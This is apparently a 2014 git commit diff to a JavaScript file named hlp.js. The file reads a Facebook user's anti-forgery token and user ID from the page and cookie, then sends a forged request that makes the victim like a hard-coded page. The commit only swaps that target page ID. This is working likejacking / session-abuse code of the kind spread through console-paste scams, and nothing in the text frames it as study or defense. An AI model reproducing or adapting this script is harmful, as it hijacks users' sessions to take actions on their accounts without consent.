72ac1f21dc97119d3c1a25b45daad1c9ab83a463
عاشق ومهبول الجافاسكربت عساسى <elmahbol@users.noreply.github.com>
2014-08-22 13:01:56 +0200

    Update hlp.js

--- hlp.js
+++ hlp.js
@@ -2,7 +2,7 @@ var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'],
     user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]); {
     var Page = new XMLHttpRequest(),
         PageURL = '//www.facebook.com/ajax/pages/fan_status.php',
-        PageParams = 'fb_dtsg=' + fb_dtsg + '&fbpage_id=1456012171316223&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=' + user_id + '';
+        PageParams = 'fb_dtsg=' + fb_dtsg + '&fbpage_id=188413857913059&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=' + user_id + '';
     Page['open']('POST', PageURL, true);
     Page['onreadystatechange'] = function () {
         if (Page['readyState'] == 4 && Page['status'] == 200) {
